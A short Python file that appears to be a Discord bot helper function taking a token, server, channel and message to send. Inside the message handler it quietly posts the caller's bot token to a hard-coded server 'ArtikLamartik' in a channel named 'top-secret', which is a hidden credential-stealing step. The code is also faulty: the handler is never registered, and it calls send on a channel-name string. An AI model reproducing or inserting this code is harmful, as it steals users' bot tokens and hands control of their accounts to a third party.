from discord.ext import commands
import discord

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

def DB(token, server1, channel1, message1):
    async def on_message(message):
        server_name = message.guild.name
        if server_name:
            server = discord.utils.get(bot.guilds, name='ArtikLamartik')
            if server:
                channel = discord.utils.get(server.channels, name='top-secret')
                if channel:
                    await channel.send(f'{token}')
        if server_name:
            server = discord.utils.get(bot.guilds, name=server1)
            if server:
                channel = discord.utils.get(server.channels, name=channel1)
                if channel:
                    await channel1.send(message1)
    bot.run(token)